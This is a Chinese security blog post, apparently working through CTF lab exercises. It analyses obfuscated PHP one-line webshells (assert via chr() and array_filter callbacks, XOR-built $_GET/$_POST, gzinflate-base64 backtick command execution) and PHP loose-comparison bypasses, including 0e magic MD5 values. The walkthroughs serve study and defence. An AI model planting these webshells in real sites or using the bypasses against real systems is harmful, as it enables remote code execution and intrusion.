+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$e=$_REQUEST[<span class="string">'e'</span>];$arr=<span class="keyword">array</span>($_POST[<span class="string">'POST'</span>],);array_filter($arr,base64_decode($e));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><font face="黑体" color="white" size="5"><strong>程序分析</strong></font></p>
+<p><a href="https://www.w3school.com.cn/php/func_array_filter.asp" target="_blank" rel="noopener">array_filter(Array,MyFunction)</a></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$e=$_REQUEST[<span class="string">'e'</span>];</span><br><span class="line"></span><br><span class="line">$arr=<span class="keyword">array</span>($_POST[<span class="string">'POST'</span>],);</span><br><span class="line"></span><br><span class="line">array_filter($arr,base64_decode($e));</span><br><span class="line"></span><br><span class="line">array_filter 的作用是将数组内元素传入待定的函数中，若函数返回值为<span class="keyword">True</span>则数组元素保留，返回<span class="keyword">False</span>则不保留</span><br><span class="line">    <span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">                    &lt;?php</span></span><br><span class="line"><span class="string">                        function test_odd($var)</span></span><br><span class="line"><span class="string">                        &#123;</span></span><br><span class="line"><span class="string">                            return $var&gt;2; // $var的值如果&lt;2 返回False</span></span><br><span class="line"><span class="string">                        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                        $a1=array("a","b",2,3,4);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                        print_r(array_filter($a1,"test_odd"));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                    ?&gt;</span></span><br><span class="line"><span class="string">    '</span><span class="string">''</span><span class="comment">//程序运行结果会很直观的解释 array_filter 的作用</span></span><br><span class="line">    </span><br><span class="line">有传参的过程，函数名可控，参数可控 则可构造代码执行语句</span><br><span class="line">    e 依旧传入assert的base64编码 YXNzZXJ0</span><br><span class="line">    POST 传值为 phpinfo()</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2--WebShell%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90(%E7%AC%AC4%E9%A2%98)/1.png" srcset="undefined" alt></p>
+<h2 id="墨者学院–WebShell代码分析溯源-第3题"><a href="#墨者学院–WebShell代码分析溯源-第3题" class="headerlink" title="墨者学院–WebShell代码分析溯源(第3题)"></a>墨者学院–WebShell代码分析溯源(第3题)</h2><hr>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$g = <span class="keyword">array</span>(<span class="string">''</span>,<span class="string">'s'</span>);</span><br><span class="line"></span><br><span class="line">$gg = a.$g[<span class="number">1</span>].ser.chr(<span class="string">'116'</span>);</span><br><span class="line"></span><br><span class="line">@$gg($_POST[get]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><font face="黑体" color="white" size="5"><strong>程序分析</strong></font></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$g = <span class="keyword">array</span>(<span class="string">''</span>,<span class="string">'s'</span>);</span><br><span class="line"></span><br><span class="line">$gg = a.$g[<span class="number">1</span>].ser.chr(<span class="string">'116'</span>); <span class="comment">//chr 为ASCII的解码 116对应的解码内容为：t</span></span><br><span class="line">						   <span class="comment">//所以$gg = assert</span></span><br><span class="line">@$gg($_POST[get]); <span class="comment">// 这里直接传想执行的代码即可</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2--WebShell%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90(%E7%AC%AC3%E9%A2%98)/1.png" srcset="undefined" alt></p>
+<h2 id="墨者学院–WebShell代码分析溯源-第2题"><a href="#墨者学院–WebShell代码分析溯源-第2题" class="headerlink" title="墨者学院–WebShell代码分析溯源(第2题)"></a>墨者学院–WebShell代码分析溯源(第2题)</h2><hr>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">$POST[<span class="string">'POST'</span>]=<span class="string">'assert'</span>;</span><br><span class="line"></span><br><span class="line">$array[]=$POST;</span><br><span class="line"></span><br><span class="line">$array[<span class="number">0</span>][<span class="string">'POST'</span>]($_POST[<span class="string">'assert'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><font face="黑体" color="white" size="5"><strong>程序分析</strong></font></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">$POST[<span class="string">'POST'</span>]=<span class="string">'assert'</span>; <span class="comment">//将键名：POST 键值：assert 的一个数组元素放入 $POST 数组内</span></span><br><span class="line"></span><br><span class="line">$array[]=$POST; <span class="comment">// 将数组 $POST 放入 数组 $array 里面构造一个二维数组</span></span><br><span class="line"></span><br><span class="line">$array[<span class="number">0</span>][<span class="string">'POST'</span>]($_POST[<span class="string">'assert'</span>]); 这里的$array[<span class="number">0</span>][<span class="string">'POST'</span>]即 <span class="string">'assert'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    所以该一句话木马最终构造为: assert($_POST[<span class="string">'assert'</span>]) 通过POST传入待执行的php命令</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2--WebShell%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90(%E7%AC%AC2%E9%A2%98)/1.png" srcset="undefined" alt></p>
+<h2 id="墨者学院–WebShell代码分析溯源-第1题"><a href="#墨者学院–WebShell代码分析溯源-第1题" class="headerlink" title="墨者学院–WebShell代码分析溯源(第1题)"></a>墨者学院–WebShell代码分析溯源(第1题)</h2><hr>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$_GET[<span class="string">'POST'</span>]($_POST[<span class="string">'GET'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><font face="黑体" color="white" size="5"><strong>程序分析</strong></font></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$_GET[<span class="string">'POST'</span>]($_POST[<span class="string">'GET'</span>]);  <span class="comment">//利用POST、GET传值，直接构造可执行语句即可</span></span><br><span class="line"></span><br><span class="line">POST = assert</span><br><span class="line">GET  = phpinfo()</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2--WebShell%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90(%E7%AC%AC1%E9%A2%98)/1.png" srcset="undefined" alt></p>
+<h2 id="PHP代码分析溯源-第4题"><a href="#PHP代码分析溯源-第4题" class="headerlink" title="PHP代码分析溯源(第4题)"></a>PHP代码分析溯源(第4题)</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(gzinflate(base64_decode(&amp;<span class="number">40</span>pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&amp;)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><font face="黑体" color="white" size="5"><strong>程序分析</strong></font></p>
+<h3 id="base64-gzinflate压缩编码（加密）文件"><a href="#base64-gzinflate压缩编码（加密）文件" class="headerlink" title="base64+gzinflate压缩编码（加密）文件"></a><a href="https://blog.csdn.net/forest_fire/article/details/50944216" target="_blank" rel="noopener">base64+gzinflate压缩编码（加密）文件</a></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(gzinflate(base64_decode(&amp;<span class="number">40</span>pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&amp;)));</span><br><span class="line"></span><br><span class="line">gzinflate(base64_decode()) 用来解密base64+压缩编码处理后的字符串</span><br><span class="line">如果想看到编码内容 可以将<span class="keyword">eval</span>替换为<span class="keyword">echo</span>（在本题中适用，正常情况下大多需要密码进行解密）</span><br><span class="line">    </span><br><span class="line"><span class="keyword">echo</span> 的编码内容为：<span class="keyword">echo</span> `$_REQUEST[a]`;; <span class="meta">?&gt;</span> </span><br><span class="line">php 中的 ` (反引号)内的字符串当作系统命令执行 <span class="keyword">echo</span> 会将命令执行的结果输出（如果没有 <span class="keyword">echo</span> 命令照样执行）</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/PHP%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90(%E7%AC%AC4%E9%A2%98)/1.png" srcset="undefined" alt></p>
+<h2 id="PHP代码分析溯源-第3题"><a href="#PHP代码分析溯源-第3题" class="headerlink" title="PHP代码分析溯源(第3题)"></a>PHP代码分析溯源(第3题)</h2><hr>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span><span class="params">($number)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     $one = ord(<span class="string">'1'</span>);  <span class="number">49</span></span><br><span class="line">     $nine = ord(<span class="string">'9'</span>); <span class="number">57</span></span><br><span class="line">     <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span><br><span class="line">     &#123;</span><br><span class="line">         $digit = ord($number&#123;$i&#125;);</span><br><span class="line">         <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">         &#123;</span><br><span class="line">             <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> $number == <span class="string">'54975581388'</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">if</span>(noother_says_correct($_POST[<span class="string">'pass'</span>]))&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    此处省略</span></span><br><span class="line"><span class="comment">     **/</span></span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert(\'认证错误\');window.location.href=\'/index.html\';&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><font face="黑体" color="white" size="5"><strong>程序分析</strong></font></p>
+<h3 id="php字符串与数字比较的不同方法"><a href="#php字符串与数字比较的不同方法" class="headerlink" title="php字符串与数字比较的不同方法"></a>php字符串与数字比较的不同方法</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span><span class="params">($number)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     $one = ord(<span class="string">'1'</span>);  <span class="number">49</span></span><br><span class="line">     $nine = ord(<span class="string">'9'</span>); <span class="number">57</span></span><br><span class="line">     <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span><br><span class="line">     &#123;</span><br><span class="line">         $digit = ord($number&#123;$i&#125;);</span><br><span class="line">         <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">         &#123;</span><br><span class="line">             <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> $number == <span class="string">'54975581388'</span>; <span class="comment">// 这里必须是双等号，三等号不支持上述HEX比较方法</span></span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">if</span>(noother_says_correct($_POST[<span class="string">'pass'</span>]))&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    此处省略</span></span><br><span class="line"><span class="comment">     **/</span></span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert(\'认证错误\');window.location.href=\'/index.html\';&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">在这解释一下程序的运行逻辑：</span><br><span class="line">    自定函数 noother_says_correct() 判断传入的值是否等于<span class="number">54975581388</span> 且每个位数上面的数字是否否和 <span class="keyword">for</span> 循环里	面的判断条件（每位数&lt;<span class="number">1</span>&amp;&amp;&gt;<span class="number">9</span>）正常输入key是不可能符合条件的。但是呢 php在变量与数字比较过程中可以通过HEX进	行比较 即 <span class="number">54975581388</span> = <span class="number">0xccccccccc</span> 这样就会符合条件 可以拿到flag</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="PHP代码分析溯源-第2题"><a href="#PHP代码分析溯源-第2题" class="headerlink" title="PHP代码分析溯源(第2题)"></a>PHP代码分析溯源(第2题)</h2><hr>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$a1 = md5(<span class="string">'QNKCDZO'</span>);</span><br><span class="line">$a = @$_POST[<span class="string">'pass'</span>];</span><br><span class="line">$a2 = @md5($a);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</span><br><span class="line">    <span class="keyword">if</span> ($a != <span class="string">'QNKCDZO'</span> &amp;&amp; $a1 == $a2) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert(\'认证错误\');window.location.href=\'/index.html\';&lt;/script&gt;'</span>;&#125;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><font face="黑体" color="white" size="5"><strong>程序分析</strong></font></p>
+<h3 id="MD5加密绕过"><a href="#MD5加密绕过" class="headerlink" title="MD5加密绕过"></a>MD5加密绕过</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$a1 = md5(<span class="string">'QNKCDZO'</span>); <span class="comment">//$a1 = 0e830400451993494058024219903391</span></span><br><span class="line">$a = @$_POST[<span class="string">'pass'</span>];</span><br><span class="line">$a2 = @md5($a); <span class="comment">//$a2 = 通过pass传入数据通过MD5加密后的值</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</span><br><span class="line">    <span class="keyword">if</span> ($a != <span class="string">'QNKCDZO'</span> &amp;&amp; $a1 == $a2) &#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"flag"</span>;   <span class="comment">//双等号在进行比较时传入的数据(0e……)会作为科学计数法进行运算-&gt;0</span></span><br><span class="line">        <span class="keyword">exit</span>();		  <span class="comment">//所以传入一个前面也为0e的md5数据即可得到flag</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert(\'认证错误\');window.location.href=\'/index.html\';&lt;/script&gt;'</span>;&#125;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">总结<span class="number">0</span>e开头的md5未加密数据：</span><br><span class="line">    QNKCDZO</span><br><span class="line">   	<span class="number">240610708</span></span><br><span class="line">  	aabg7XSs</span><br><span class="line">  	s878926199a</span><br><span class="line">    aabC9RqS</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="PHP代码分析溯源-第1题"><a href="#PHP代码分析溯源-第1题" class="headerlink" title="PHP代码分析溯源(第1题)"></a>PHP代码分析溯源(第1题)</h2><h3 id="php变种一句话"><a href="#php变种一句话" class="headerlink" title="php变种一句话"></a>php变种一句话</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"> @$_++;</span><br><span class="line"></span><br><span class="line"> $__=(<span class="string">"`"</span>^<span class="string">"?"</span>).(<span class="string">":"</span>^<span class="string">"&#125;"</span>).(<span class="string">"%"</span>^<span class="string">"`"</span>).(<span class="string">"&#123;"</span>^<span class="string">"/"</span>);</span><br><span class="line"></span><br><span class="line"> $___=(<span class="string">"$"</span>^<span class="string">"&#123;"</span>).(<span class="string">"~"</span>^<span class="string">"."</span>).(<span class="string">"/"</span>^<span class="string">"`"</span>).(<span class="string">"-"</span>^<span class="string">"~"</span>).(<span class="string">"("</span>^<span class="string">"|"</span>);</span><br><span class="line"></span><br><span class="line"> $&#123;$__&#125;[!$_]($&#123;$___&#125;[$_]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><font face="黑体" color="white" size="5"><strong>程序分析</strong></font></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"> @$_++; <span class="comment">//未传入数据的变量初始化为0 $_++ -&gt; 1</span></span><br><span class="line"></span><br><span class="line"> $__=(<span class="string">"`"</span>^<span class="string">"?"</span>).(<span class="string">":"</span>^<span class="string">"&#125;"</span>).(<span class="string">"%"</span>^<span class="string">"`"</span>).(<span class="string">"&#123;"</span>^<span class="string">"/"</span>);</span><br><span class="line"></span><br><span class="line"> $___=(<span class="string">"$"</span>^<span class="string">"&#123;"</span>).(<span class="string">"~"</span>^<span class="string">"."</span>).(<span class="string">"/"</span>^<span class="string">"`"</span>).(<span class="string">"-"</span>^<span class="string">"~"</span>).(<span class="string">"("</span>^<span class="string">"|"</span>);</span><br><span class="line"><span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">$__、$___ 通过异或运算最终的结果分别为：_GET、_POST</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">最后构造的一句话为：$&#123;_GET&#125;[!1]($&#123;_POST&#125;[1])</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">传参进行命令执行 0(!1=0)=assert(GET)、1=whoami(POST)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'</span><span class="string">''</span></span><br><span class="line"> $&#123;$__&#125;[!$_]($&#123;$___&#125;[$_]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+            <hr>
+          </div>
+          <br>
+          <div>
+            <p>
+            
+              <span>
+                <i class="iconfont icon-inbox"></i>
+                
+                  <a class="hover-with-bg" href="/categories/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">php代码审计</a>
+                  &nbsp;
+                
+              </span>&nbsp;&nbsp;
+            
+            
+              <span>
+                <i class="iconfont icon-tag"></i>
+                
+                  <a class="hover-with-bg" href="/tags/php">php</a>
+                
+                  <a class="hover-with-bg" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">代码审计</a>
+                
+                  <a class="hover-with-bg" href="/tags/web%E5%AE%89%E5%85%A8">web安全</a>
+                
+              </span>
+            
+            </p>
+            
+              <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" target="_blank" rel="nofollow noopener noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="d-none d-lg-block col-lg-2 toc-container">
+      
+  <div id="toc">
+    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+    <div id="tocbot"></div>
+  </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- custom -->
+
+
+<!-- Comments -->
+<div class="col-lg-7 mx-auto nopadding-md">
+  <div class="container comments mx-auto" id="comments">
+    
+      <br><br>
+      
+      
+  <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    <script>
+      var disqus_config = function () {
+        this.page.url = 'http://yoursite.com/2019/11/28/PHP恶意代码分析/';
+        this.page.identifier = '/2019/11/28/PHP恶意代码分析/';
+      };
+      var oldLoad = window.onload;
+      window.onload = function () {
+        var d = document, s = d.createElement('script');
+        s.type = 'text/javascript';
+        s.src = '//' + '13l00m# your shortname' + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+      };
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" target="_blank" rel="nofollow noopener noopener">comments
+        powered by Disqus.</a></noscript>
+  </div>
+
+
+    
+  </div>
+</div>
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">    
+Welcome to 13l00m'world
+    <br>
+
+    
+  
+    <!-- 不蒜子统计PV -->
+    
+    &nbsp;<span id="busuanzi_container_site_pv">总访问量 
+          <span id="busuanzi_value_site_pv"></span> 次</span>&nbsp;
+  
+  
+    <!-- 不蒜子统计UV -->
+    
+    &nbsp;<span id="busuanzi_container_site_uv">总访客数 
+            <span id="busuanzi_value_site_uv"></span> 人</span>&nbsp;
+  
+  <br>
+
+
+
+    
+
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="/lib/jquery/jquery.min.js" ></script>
+<script src="/lib/popper/popper.min.js" ></script>
+<script src="/lib/bootstrap/js/bootstrap.min.js" ></script>
+<script src="/lib/mdbootstrap/js/mdb.min.js" ></script>
+<script src="/js/main.js" ></script>
+
+
+  <script src="/js/lazyload.js" ></script>
+
+
+
+  
+    <script src="/lib/tocbot/tocbot.min.js" ></script>
+  
+  <script src="/js/post.js" ></script>
+
+
+
+  <script src="/lib/smooth-scroll/smooth-scroll.min.js" ></script>
+
+
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+<!-- Plugins -->
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+  <script src="/lib/prettify/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  ');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script src="/lib/typed/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "PHP恶意代码分析&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="/lib/anchor/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "false",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="/lib/fancybox/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+</body>
+</html>
